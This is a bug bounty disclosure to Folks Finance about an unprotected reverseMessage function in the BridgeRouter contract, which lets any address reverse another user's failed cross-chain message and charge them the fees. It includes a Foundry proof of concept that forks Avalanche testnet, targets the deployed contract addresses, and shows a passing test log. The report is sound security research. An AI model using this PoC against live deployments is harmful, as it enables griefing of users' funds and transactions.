# Boost \_ Folks Finance 33652 - \[Smart Contract - Insight] BridgeRouters Unprotected Reversal Function

Submitted on Thu Jul 25 2024 15:22:10 GMT-0400 (Atlantic Standard Time) by @A2Security for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33652

Report type: Smart Contract

Report severity: Insight

Target: <https://testnet.snowtrace.io/address/0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `BridgeRouter` system allows unauthorized reversal of failed transactions, enabling attackers to disrupt operations and force users to incur unnecessary costs. This vulnerability could lead to financial losses, prevent legitimate transactions.

## Vulnerability Details

* The reverse message functionality in the `BridgeRouter` system is designed to cancle failed cross-chain messages. Here's how it operates:

1. When a message fails during execution on the destination chain, it's stored in the `BridgeRouter` contract as a failed message.
2. The `reverseMessage` function in the `BridgeRouter` can be called with the *adapterId* and *messageId* of the failed message: \`
3. This function retrieves the failed message, clears it from storage, and calls the `reverseMessage` function on the corresponding handler (typically the Hub contract).

```js
   function reverseMessage(uint16 adapterId, bytes32 messageId, bytes memory extraArgs) external payable {
        // some code ..
        try BridgeMessenger(handler).reverseMessage(message, extraArgs) {
            // clear failure and emit message reverse as suceeded
            emit MessageReverseSucceeded(adapterId, message.messageId);
        } catch (bytes memory err) {
            // store and emit message reverse as failed
            failedMessages[adapterId][message.messageId] = message;
            emit MessageReverseFailed(adapterId, message.messageId, err);
        }
    }
```

4. In the Hub contract, the `_reverseMessage` function processes the reversal:
5. The Hub verifies the token receipt from the original transaction and initiates a token return to the user on the source chain.
6. To complete the reversal, the Hub calls back to the BridgeRouter to send a cross-chain message returning the tokens.

```js
    function _reverseMessage(Messages.MessageReceived memory message, bytes memory extraArgs) internal override {
        Messages.MessagePayload memory payload = Messages.decodeActionPayload(message.payload);

        // check sender has permission for relevant operations, overriding account id if neccessary
        bytes32 accountId = extraArgs.length == 0 ? payload.accountId : extraArgs.toBytes32(0);
        bool isRegistered =
            accountManager.isAddressRegisteredToAccount(accountId, message.sourceChainId, payload.userAddress);
        if (!isRegistered) {
            revert IAccountManager.NotRegisteredToAccount(accountId, message.sourceChainId, payload.userAddress);
        }
        // some code . .
        sendTokenToUser(
            message.returnAdapterId,
            message.returnGasLimit,
            accountId,
            payload.userAddress,
            SendToken({poolId: poolId, chainId: message.sourceChainId, amount: amount})
        );
    }

    function sendTokenToUser(
        uint16 adapterId,
        uint256 gasLimit,
        bytes32 accountId,
        bytes32 recipient,
        SendToken memory sendToken
    ) internal {
        // some code ..
        // send message (balance for user account already present in bridge router)
 >>       _sendMessage(messageToSend, 0);
    }
```

7. The `BridgeRouter` sends this cross-chain message, using fees from the balance associated with the original user's **`accountId`**.

```js
   function sendMessage(Messages.MessageToSend memory message)/*...*/ {

        // check if have sufficient funds to pay fee (can come from existing balance and/or msg.value)
        bytes32 userId = _getUserId(Messages.decodeActionPayload(message.payload));
  >>    uint256 userBalance = balances[userId];
        if (msg.value + userBalance < fee) revert NotEnoughFunds(userId);

        // update user balance considering fee and msg.value
 >>     balances[userId] = userBalance + msg.value - fee;

        // call given adapter to send message
        adapter.sendMessage{value: fee}(message);
    }

```

* The core issue lies in the lack of propore access control and the ability for **anyone** to call the `reverseMessage()` function in `bridgeRouter` contract for any failed messages (for allowed actions like deposit/repay ..ect), usurping the rightful decision-making power of the original message sender:

This vulnerability allows **malicious actors** to force the reversal of transactions against the wishes of the original sender This is problematic for various reasons:

1. **User Autonomy**: The users who initiate cross-chain messages are the only ones who should have the authority to decide whether to retry or reverse a failed message. They have the context of their intended operation and are best positioned to make this decision. Moreover, they bear the financial consequences of both the initial transaction and any subsequent actions.
2. **Financial Implications**: When a reversal is initiated, the fees for the return message are deducted from the user's balance in the BridgeRouter. This can lead to unexpected costs for the user, especially if the reversal is to a high-fee network like Ethereum mainnet.
3. **Exploitation of Failed Transactions**: Even in cases where a transaction fails due to easily rectifiable issues (like slightly insufficient gas), an attacker can force a costly reversal instead of allowing a simple retry.
4. **Smart Contract integration**: Contracts interacting with this system may not be designed to handle unexpected reversals, potentially leading to locked funds or corrupted contract states.

* The lack of restrictions on who can call `reverseMessage()` and the absence of a mechanism to prioritize the original sender's intentions make this a **severe vulnerability** in the current system design.

## Impact Details

This vulnerability allows malicious users to reverse transactions sent by others, even if those transactions are retryable. When a transaction is reversed:

1. The original user loses the cost of sending the initial transaction from the spoke chain.
2. The user incurs the cost of reversing the transaction, which is deducted from their balance on the hub chain.
3. Users lose control over the decision to retry or reverse their transactions.
4. For actions that allow reversal, users can be griefed, preventing them from ever successfully retrying their transactions.

The attacker only needs to pay gas fees on the hub chain (Avalanche), which are relatively cheap. This creates an asymmetric situation where the attacker can cause significant financial damage to users at a low cost to themselves, potentially disrupting the entire cross-chain messaging system.

## References

* **BridgeRouter.sol**
* **Hub.sol**
* **SpokeToken.sol**
* **CCIPTokenAdapter.sol**

## Proof of concept

## Proof of Concept

We have added a proof of concept, in foundry that forks avalanche fugi and interacts with the deployed version of the protocol in testnet. To run the proof of concept please add the following files under tests. Please also make sure foundry is initialized in the project, and declare the custom remapping @forge-std

First FIle: `test/pocs/base_test.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "@forge-std/Test.sol";
import "contracts/hub/Hub.sol";
import "contracts/spoke/SpokeToken.sol";
import "contracts/spoke/SpokeCommon.sol";
import "contracts/hub/HubPool.sol";
import "contracts/hub/LoanManager.sol";
import "contracts/bridge/libraries/Messages.sol";
import "contracts/hub/AccountManager.sol";
import "contracts/bridge/BridgeRouter.sol";
import "contracts/bridge/HubAdapter.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract baseTest is Test {
    using SafeERC20 for address;
    // Hub public hub;

    uint256 mainnetFork;
    bytes32 public constant PREFIX = "HUB_ADAPTER_V1";
    address constant HUB_ADDRESS = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140; // Assuming this is the Hub address
    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;
    address constant SPOKE_USDC = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;
    address constant HUBPOOL_USDC = 0x1968237f3a7D256D08BcAb212D7ae28fEda72c34;
    address constant HUBPOOL_AVAX = 0xd90B7614551E799Cdef87463143eCe2efd4054f9;
    address constant SPOKE_AVAX = 0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a;
    address constant LOAN_MANAGER = 0x2cAa1315bd676FbecABFC3195000c642f503f1C9;
    address constant ACCOUNT_MANAGER = 0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc;
    address constant USDC_TOKEN = 0x5425890298aed601595a70AB815c96711a31Bc65;
    address constant ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;
    uint16 constant STABELE_LOAN_TYPE_ID = 1;
    uint16 constant VARIABLE_LOAN_TYPE_ID = 2;
    uint16 constant CHAIN_ID = 1; // Assuming Ethereum mainnet
    Hub hub;
    SpokeCommon spokeCommon;
    AccountManager accountManager;
    SpokeToken spokeUsdc;
    SpokeToken spokeAvax;
    HubPool hubPoolUsdc;
    HubPool hubPoolAvax;
    LoanManager loanManager;
    HubAdapter adapter;
    Messages.MessageParams DUMMY_MESSAGE_PARAMS = Messages.MessageParams({adapterId: 1, returnAdapterId: 1, receiverValue: 0, gasLimit: 0, returnGasLimit: 0});
    ///// users account ids :
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    bytes32 bobAccountId;
    bytes32 aliceAccountId;
    bytes32[] bobLoanIds;
    bytes32[] aliceLoanIds;

    function setUp() public {
        // Fork Avalanche mainnet
        mainnetFork = vm.createFork("https://api.avax-test.network/ext/bc/C/rpc", 35000569);
        vm.selectFork(mainnetFork);

        // Initialize contracts
        hub = Hub(HUB_ADDRESS);
        spokeCommon = SpokeCommon(SPOKE_COMMON);
        spokeUsdc = SpokeToken(SPOKE_USDC);
        spokeAvax = SpokeToken(SPOKE_AVAX);
        hubPoolUsdc = HubPool(HUBPOOL_USDC);
        hubPoolAvax = HubPool(HUBPOOL_AVAX);
        loanManager = LoanManager(LOAN_MANAGER);
        accountManager = AccountManager(ACCOUNT_MANAGER);
        adapter = HubAdapter(ADAPTER);
        // create account ids for bob and alice :
        address[] memory _users = new address[](2);
        _users[0] = bob;
        _users[1] = alice;
        bytes32[] memory ids = _createAccounts(_users);
        bobAccountId = ids[0];
        aliceAccountId = ids[1];
        // create loanids for alice and bob :
        bobLoanIds.push(_createLoan(bobAccountId, bob, 1, STABELE_LOAN_TYPE_ID));
        aliceLoanIds.push(_createLoan(aliceAccountId, alice, 1, STABELE_LOAN_TYPE_ID));
        // credit bob and alice with 1M usdc and 1000 avax each :
        deal(USDC_TOKEN, bob, 1e12);
        deal(USDC_TOKEN, alice, 1e12);
        vm.deal(bob, 1000e18);
        vm.deal(alice, 1000e18);
    }
    ////////////////////////////////////// helpers ///////////////////////////////////////////

    function _creditAvax(address to, uint256 amount) internal {
        vm.deal(to, amount);
    }

    function _creditUsdc(address to, uint256 amount) internal {
        deal(USDC_TOKEN, to, amount);
    }

    function _approveUsdc(address from, address to, uint256 amount) internal {
        vm.prank(from);
        IERC20(USDC_TOKEN).approve(to, amount);
    }

    function _createAccounts(address[] memory users) internal returns (bytes32[] memory) {
        bytes32 id;
        bytes32[] memory ids = new bytes32[](users.length);
        for (uint256 i = 0; i < users.length; i++) {
            id = keccak256(abi.encode(i, "testing"));
            vm.prank(users[i]);
            spokeCommon.createAccount(DUMMY_MESSAGE_PARAMS, id, "");
            assertTrue(accountManager.isAccountCreated(id));
            ids[i] = id;
        }
        return ids;
    }

    function _createLoan(bytes32 accId, address _sender, uint256 nonce, uint16 _loanType) internal returns (bytes32) {
        bytes32 loanId = keccak256(abi.encode(accId, nonce, "loan"));
        uint16 loanType = _loanType;
        bytes32 loanName = keccak256(abi.encode(loanId, loanType));
        // create the loan :
        vm.prank(_sender);
        spokeCommon.createLoan(DUMMY_MESSAGE_PARAMS, accId, loanId, loanType, loanName);
        // check if the loan is created :
        assertTrue(loanManager.isUserLoanActive(loanId));
        return loanId;
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, uint256 nonce, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = keccak256(abi.encode(_accountId, nonce, "loan"));
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, bytes32 _loanId, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = _loanId;
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _borrowVariable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, 0);
    }

    function _borrowStable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, _maxStableRate);
    }

    function _borrow(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        vm.prank(sender);
        spokeCommon.borrow(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, _maxStableRate);
    }

    function _deposit(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke) internal {
        vm.prank(sender);
        spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
    }

    function _withdraw(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, bool isFAmount) internal {
        vm.prank(sender);
        spokeCommon.withdraw(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, isFAmount);
    }

    function _repay(bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke, uint256 maxOverRepayment) internal {
        vm.prank(bob);
        spoke.repay(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount, maxOverRepayment);
    }

    function _getMsgId() internal view returns (bytes32) {
        uint256 s = adapter.sequence();
        return keccak256(abi.encodePacked(PREFIX, s));
    }

    function _checkSeccuss(bytes32 msgId) internal {
        vm.expectEmit();
        emit BridgeRouter.MessageSucceeded(1, msgId);
    }

    function _checkMessageSeccuss() internal {
        // vm.exepctEmit(true,false,false);
        // emit BridgeRouter.MessageSuccess(0,"");
    }
}

```

Second File (includes the poc): `test/pocs/forktest.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "./base_test.sol";

event MessageSucceeded(uint16 adapterId, bytes32 indexed messageId);

event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);

contract Pocs is baseTest {
    ////////////////////////////////////////////////////////////////////////////////////////////

    // @remind : poc of non access controle on reverse messages :
    function test_noAccessControlOnReverse() public {
        // get bob balance before action :
        uint256 bobBalanceBefore = IERC20(USDC_TOKEN).balanceOf(bob);
        bytes32 loanId = aliceLoanIds[0];
        bytes32 msgId = _getMsgId();
        _approveUsdc(bob, address(spokeUsdc), 1000e6);
        _createLoanAndDeposit(bobAccountId, bob, loanId, STABELE_LOAN_TYPE_ID, 1000e6, spokeUsdc);
        BridgeRouter router = BridgeRouter(hub.getBridgeRouter());
        assertTrue(router.seenMessages(1, msgId));
        uint256 bobBalanceAfter = IERC20(USDC_TOKEN).balanceOf(bob);
        assertTrue(bobBalanceBefore - bobBalanceAfter == 1000e6);
        // reverse the tx by a random address :
        vm.prank(address(32423));
        router.reverseMessage(1, msgId, "");
        assertTrue(bobBalanceBefore == IERC20(USDC_TOKEN).balanceOf(bob));
    }
}

```

This is the resul if we execute the test with `forge test --mt test_noAccessControlOnReverse -vv`

```log
Ran 1 test for test/pocs/forktest.t.sol:Pocs
[PASS] test_noAccessControlOnReverse() (gas: 577286)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 589.91ms (4.21ms CPU time)

Ran 1 test suite in 592.58ms (589.91ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
